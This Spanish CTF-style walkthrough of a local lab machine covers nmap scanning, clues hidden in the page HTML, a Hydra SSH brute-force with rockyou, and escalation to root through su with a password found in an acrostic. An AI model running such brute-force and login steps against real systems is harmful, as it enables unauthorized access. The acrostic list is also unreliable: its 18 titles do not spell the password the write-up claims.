## Resumen

Máquina Linux que simula un entorno Windows falso (banner SSH y prompt de PowerShell) para despistar. El acceso inicial se consigue identificando dos pistas ocultas en el HTML de la web: un nombre de usuario embebido en el CSS (`top: pipe`) y un acróstico formado por las iniciales de los títulos H2 que revela la contraseña de root. Tras acceder por SSH como `pipe` mediante fuerza bruta, la escalada a root se consigue usando esa contraseña directamente con `su`.

---

## 1. Reconocimiento

```bash
sudo nmap -sS -p- --open --min-rate 5000 172.17.0.2 -oG nmap
nmap -sVC -p22,80 172.17.0.2 -oG serve
```

Puertos abiertos:

- 22/tcp → OpenSSH 9.6p1 (Ubuntu)
- 80/tcp → Apache 2.4.58 — "TechWorld Noticias"

---

## 2. Análisis del código fuente — dos pistas ocultas

```bash
curl 172.17.0.2
```

El código fuente HTML contiene dos anomalías que no tienen sentido en una web legítima:

### Pista 1 — nombre de usuario en el CSS

Dentro del bloque de estilos del `<body>` hay una propiedad CSS inválida:

```css
body {
    ...
    top: pipe;
}
```

`top: pipe` no es CSS válido — `top` acepta valores numéricos o `auto`, no un string arbitrario. Su presencia aquí es deliberada y apunta a `pipe` como un posible nombre de usuario del sistema.

### Pista 2 — acróstico en los títulos H2

El HTML contiene una etiqueta con un atributo inusual:

```html
<article hidden="acrostico inicial">
    <h2>HIDDEN</h2>
</article>
```

La pista "acróstico inicial" indica que hay que tomar la **primera letra de cada título H2** de la página en orden. Extrayendo las iniciales de los 21 artículos:

```
Wireless
Inteligencia Artificial
Nuevas energías
Sistemas operativos
Economía digital
Robots médicos
Red 5G
Organizaciones internacionales
Origen de la computación cuántica
Transformación digital
Fotografía computacional
Algoritmos éticos
Keyboards mecánicos
Enfoque global
Nuevos materiales
Exploración de exoplanetas
Wearables
Seguridad en la nube
```

Las iniciales forman: **`WINSERVERROOTFAKENEWS`**

Formateado con capitalización estándar: **`WinServerRootFakeNews`**

---

## 3. Acceso SSH como pipe — fuerza bruta con Hydra

Con el usuario `pipe` identificado y sin contraseña conocida, se lanza Hydra contra SSH:

```bash
hydra -l 'pipe' -P /opt/rockyou.txt ssh://172.17.0.2 -t 4
```

```
[22][ssh] host: 172.17.0.2   login: pipe   password: kisses
```

```bash
ssh pipe@172.17.0.2
# contraseña: kisses
```

Al conectarse, el banner simula un entorno Windows:

```
Microsoft Windows [Versión 10.0.19045.4412]
Windows PowerShell
PS C:\Users\pipe>
```

Es una trampa estética — el sistema real es Ubuntu 24.04. Los comandos de Linux funcionan con normalidad.

Flag de usuario en `/home/pipe/user.txt`.

---

## 4. Escalada a root — acróstico como contraseña

El acróstico obtenido del código fuente (`WinServerRootFakeNews`) se prueba como contraseña de root:

```bash
su root
# contraseña: WinServerRootFakeNews
```

```bash
id      # uid=0(root) gid=0(root) groups=0(root)
whoami  # root
```

Flag de root en `/root/root.txt`.

---

## Cadena de ataque

```
curl 172.17.0.2 → código fuente HTML
        ↓
top: pipe → nombre de usuario
        ↓
Hydra SSH → pipe:kisses
        ↓
SSH como pipe → user flag
        ↓
Acróstico H2 → WinServerRootFakeNews
        ↓
su root → root flag
```